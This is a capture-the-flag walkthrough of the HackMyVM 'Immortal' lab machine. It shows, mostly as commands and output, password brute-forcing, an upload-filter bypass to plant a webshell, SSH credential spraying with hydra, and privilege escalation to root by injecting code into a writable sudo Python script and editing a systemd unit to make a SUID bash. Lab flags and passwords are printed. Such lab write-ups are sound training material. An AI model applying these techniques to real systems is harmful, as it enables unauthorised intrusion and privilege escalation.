# Immortal

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.36:22
Open 10.0.2.36:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.36
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 e8:79:ad:8b:d1:a8:39:1b:ac:ed:52:ef:d0:22:0e:eb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8kDap5ZB35L8e95K3UxQLM+Do39cnr7giL7TSRx0aWFlG1UdP1kNqaAaT64rPZb9UTfXLePDegaRKvVZ4COOZwIoHjWNxUyD6J3fDhvv+SyMnSP5fByIZSP9DYKEAoUEIXGg/Dr+xXFmGlqs7knDepO/RuoLdOJ2fIwYagz/j4gMPr2z404dskyFiAEEUZg2P66areo80YI7/8SNZHE/XQhW8Sf52y6hkyYDYJHJRkfFtdYxuu63lHYFKeQTVxxba14mndnxqYOFJ9GsUujkrXYXwcfTJ7sw7zIrJ8z0ghRM6YjecWHKMc4TgShkiKTh8yXvX0C9qmjYzETsDjEXIoiie7dZD1MKOWH2C6oPsWzSc5YTuu8XNvdsK6+xRiqYgqEw7eGQYssAXOuxMg6tTYto9aVQL+8q8RjdDlHb64TJnxcMVAWZ7bwEXw8SEaXnvMOjeJ/eW6fT46rA/A2xCuCxILKGWCGGtfvux/DHgCr1t8oryPHiQtnhvHpXcGrM=
|   256 65:df:6d:1d:49:11:bd:f3:2f:fa:10:0c:3b:48:69:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMbqCj6qsUHotYSAdbUv67n4up5aUQ1HN4KDcEqti9/SRmNN3BBm0uoRsSHCWI/VCgvVo10i6ad5L81hGHgbQ7M=
|   256 f6:b7:bf:cf:a5:d5:1b:26:4e:13:08:31:07:d5:79:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHEUXs5XAm166vEa3NuQ+R2B4rj3CSbf3mOGRPx+gJB7
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: Password
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/immortal/writeup.png)

### Bruteforce Password

Fuzzing didn't provide much, but looks like we have to bruteforce the password.
```bash
└─$ feroxbuster -u http://10.0.2.36 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
# Nothing
└─$ feroxbuster -u http://10.0.2.36 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
# Stopped
```

```bash
└─$ ffuf -u 'http://10.0.2.36/index.php' -H 'content-type: application/x-www-form-urlencoded' -d 'password=FUZZ' -w $rockyou -t 40 -fr 'Incorrect credentials'
santiago                [Status: 302, Size: 1837, Words: 692, Lines: 74, Duration: 10ms]
```

### Uploaded files discovery

![writeup-1.png](/assets/pentest/hackmyvm/immortal/writeup-1.png)

```bash
└─$ curl http://10.0.2.36/longlife17/chat/message3.txt
Message to all.
I'm glad you made it, I knew you would guess the password, it's the one we always used, although Boyras recommended us to stop using it because "it was in rockyou".
By the way guys, you can still upload messages to the server from this new path -> upload_an_incredible_message.php
Saying goodbye very happy, David
```

Hmmm... [http://10.0.2.36/longlife17/important/important.txt](http://10.0.2.36/longlife17/important/important.txt)

![writeup-2.png](/assets/pentest/hackmyvm/immortal/writeup-2.png)

Nothing, bunch of nonsense 
```bash
└─$ ffuf -u 'http://10.0.2.36/longlife17/tests/testFUZZ.txt' -w <(seq 1 30)
1                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 0ms]
11                      [Status: 200, Size: 39, Words: 4, Lines: 4, Duration: 15ms]
8                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 17ms]
24                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 18ms]
10                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 20ms]
9                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 20ms]
5                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 10ms]
14                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 6ms]
16                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 6ms]
15                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 6ms]
25                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 6ms]
13                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 7ms]
2                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 11ms]
23                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 10ms]
6                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 10ms]
4                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 10ms]
3                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 9ms]
12                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 1227ms]
29                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 2240ms]
30                      [Status: 200, Size: 159, Words: 23, Lines: 11, Duration: 2240ms]
7                       [Status: 200, Size: 16, Words: 4, Lines: 2, Duration: 2244ms]
28                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 3240ms]
27                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 3240ms]
21                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 3239ms]
20                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 3243ms]
19                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 4260ms]
18                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 4260ms]
17                      [Status: 200, Size: 28, Words: 8, Lines: 4, Duration: 4261ms]
26                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 4278ms]
22                      [Status: 200, Size: 17, Words: 4, Lines: 2, Duration: 4286ms]
```

### Super Secret Upload

The upload form only allows filenames ending with txt
![writeup-3.png](/assets/pentest/hackmyvm/immortal/writeup-3.png)

#### Upload Bypass

`phtml` is allowed
```bash
└─$ B="----WebKitFormBoundary7MA4YWxkTrZu0gW"

└─$ ffuf -u 'http://10.0.2.36/upload_an_incredible_message.php' -H "Content-Type: multipart/form-data; boundary=${B}" -d $'--'"${B}"$'\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n--'"${B}"$'\r\nContent-Disposition: form-data; name="file"; filename="test.FUZZ"\r\nContent-Type: plain/text\r\n\r\nletmein\r\n--'"${B}"$'--\r\n' -w /usr/share/seclists/Fuzzing/file-extensions-lower-case.txt -fw 52
txt                     [Status: 200, Size: 424, Words: 44, Lines: 16, Duration: 9ms]

└─$ ffuf -u 'http://10.0.2.36/upload_an_incredible_message.php' -H "Content-Type: multipart/form-data; boundary=${B}" -d $'--'"${B}"$'\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n--'"${B}"$'\r\nContent-Disposition: form-data; name="file"; filename="test.FUZZ"\r\nContent-Type: plain/text\r\n\r\nletmein\r\n--'"${B}"$'--\r\n' -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt -fw 52
txt                     [Status: 200, Size: 424, Words: 44, Lines: 16, Duration: 4ms]
phtml                   [Status: 200, Size: 424, Words: 44, Lines: 16, Duration: 10ms]
```

### Webshell

```bash
└─$ curl 'http://10.0.2.36/upload_an_incredible_message.php' -F 'submit=Upload' -F 'file=@shell.php;filename=letmein.phtml;type=text/plain'
The file letmein.phtml has been uploaded
```

![writeup-4.png](/assets/pentest/hackmyvm/immortal/writeup-4.png)

```bash
www-data@Immortal:/var/www# find /home -type f -ls 2>/dev/null
    37681      4 -rw-r--r--   1 drake    drake         134 Feb 27  2024 /home/drake/.../pass.txt
       33      4 -rw-r--r--   1 drake    drake        3526 Feb 27  2024 /home/drake/.bashrc
    26598      4 -rw-r--r--   1 drake    drake         220 Feb 27  2024 /home/drake/.bash_logout
    37666      4 -rw-r--r--   1 drake    drake         807 Feb 27  2024 /home/drake/.profile
    37676      4 -rw-r--r--   1 drake    drake          20 Feb 27  2024 /home/drake/user.txt
    62956      4 -rw-r--r--   1 eric     eric          134 Feb 27  2024 /home/eric/.note.txt
       13      4 -rw-r--r--   1 eric     eric         3526 Feb 27  2024 /home/eric/.bashrc
    37665      4 -rw-r--r--   1 eric     eric          220 Feb 27  2024 /home/eric/.bash_logout
    37700      4 -rw-r--r--   1 eric     eric          807 Feb 27  2024 /home/eric/.profile

www-data@Immortal:/var/www# cat /home/drake/.../pass.txt
netflix : drake123
amazon : 123drake
shelldred : shell123dred (f4ns0nly)
system : kevcjnsgii
bank : myfavouritebank
nintendo : 123456

www-data@Immortal:/var/www# grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000:david,,,:/home/david:/bin/bash
drake:x:1001:1001:,,,:/home/drake:/bin/bash
eric:x:1002:1002:,,,:/home/eric:/bin/bash
```

## SSH (drake)

```bash
└─$ cat users.txt
root
david
drake
eric

└─$ cat pass.txt
drake123
123drake
shell123dred
f4ns0nly
kevcjnsgii
myfavouritebank
123456

└─$ hydra -L ./users.txt -P ./pass.txt 10.0.2.36 ssh -t 4 -I
[22][ssh] host: 10.0.2.36   login: drake   password: kevcjnsgii
```

```bash
└─$ sshpass -p 'kevcjnsgii' ssh drake@10.0.2.36
drake@Immortal:~$ id
uid=1001(drake) gid=1001(drake) groups=1001(drake)
```

### User.txt

```bash
drake@Immortal:~$ cat user.txt
nothinglivesforever
```

## Privilege Escalation (eric)

```
drake@Immortal:~$ sudo -l
Matching Defaults entries for drake on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drake may run the following commands on Immortal:
    (eric) NOPASSWD: /usr/bin/python3 /opt/immortal.py
    
drake@Immortal:~$ cat /opt/immortal.py
a = input(str("Do you want to be immortal: "))

if a.lower() == "yes" or a.lower() == "no":
   print("Bad answer")
else:
   print("Are you sure?")
   
drake@Immortal:~$ ls -lah /opt/
total 16K
drwxr-xr-x  2 root root 4.0K Feb 28  2024 .
drwxr-xr-x 18 root root 4.0K Feb 27  2024 ..
-rw-rw-rw-  1 root root  147 Feb 28  2024 immortal.py
-rw-r--r--  1 root root   36 Feb 28  2024 immortal.txt
```

We have write permissions on file.
```bash
drake@Immortal:~$ echo $'\n__import__("os").system("/bin/bash -p")' >> /opt/immortal.py

drake@Immortal:~$ sudo -u eric python3 /opt/immortal.py
Do you want to be immortal: y
Are you sure?
eric@Immortal:/home/drake$ id
uid=1002(eric) gid=1002(eric) groups=1002(eric)
```

## Privilege Escalation (root)

```bash
eric@Immortal:~$ cat .note.txt
I think I should tell David that this immortality thing is not a good idea, although I'm sad to tell him, he's so excited about it...

eric@Immortal:~$ sudo -l
Matching Defaults entries for eric on Immortal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eric may run the following commands on Immortal:
    (root) NOPASSWD: sudoedit /etc/systemd/system/immortal.service
    (root) NOPASSWD: /usr/bin/systemctl start immortal.service
    (root) NOPASSWD: /usr/bin/systemctl stop immortal.service
    (root) NOPASSWD: /usr/bin/systemctl enable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl disable immortal.service
    (root) NOPASSWD: /usr/bin/systemctl daemon-reload
```

The service is running `bash` with very simple echo and outputs to `/opt/immortal.txt`. Service is not writeable, but we can use `sudoedit`
```bash
eric@Immortal:~$ cat /etc/systemd/system/immortal.service;
[Unit]
Description=Immortal Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'echo "Every man dies. Not every man lives" > /opt/immortal.txt'

[Install]
WantedBy=multi-user.target
eric@Immortal:~$ ls -l /etc/systemd/system/immortal.service;
-rw-r--r-- 1 root root 207 Feb 28  2024 /etc/systemd/system/immortal.service
```

```bash
eric@Immortal:~$ sudoedit /etc/systemd/system/immortal.service
ExecStart=/bin/bash -c 'echo "Every man dies. Not every man lives" > /opt/immortal.txt && install -m4777 /bin/bash /tmp/rootbash'
eric@Immortal:~$ sudo systemctl start immortal.service
eric@Immortal:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1002(eric) gid=1002(eric) euid=0(root) groups=1002(eric)
rootbash-5.1# cat /root/.b
You are very observant
```

### Root.txt

```
rootbash-5.1# cat /root/root.txt
fiNally1mMort4l
```

